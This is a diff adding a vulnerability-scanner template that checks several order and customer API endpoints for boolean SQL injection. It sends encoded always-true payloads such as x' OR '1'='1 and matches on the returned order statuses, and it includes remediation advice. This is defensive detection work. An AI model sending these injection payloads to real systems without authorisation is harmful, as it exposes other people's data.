@@ -1,0 +1,25 @@
+id: acme-sqli-boolean
+info:
+  name: SQL Injection (Boolean, always-true predicate)
+  severity: high
+  tags: [sqli, injection]
+  description: "An always-true SQL predicate in a query parameter returned rows that a literal match could not return, so the parameter is evaluated as SQL."
+  remediation: "Use parameterized queries; never concatenate request values into SQL text."
+  cwe: "CWE-89"
+  owasp: "A03:2021-Injection"
+
+requests:
+  - method: GET
+    paths:
+      - "/api/orders/search?status=x%27%20OR%20%271%27%3D%271"
+      - "/api/orders/by-status?status=x%27%20OR%20%271%27%3D%271"
+      - "/api/orders/by-reference?reference=x%27%20OR%20%271%27%3D%271"
+      - "/api/customers/by-region?region=x%27%20OR%20%271%27%3D%271"
+      - "/api/orders/lookup?term=%25%27%20OR%201%3D1%20--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["\"cancelled\"", "\"pending\""]
+        condition: and
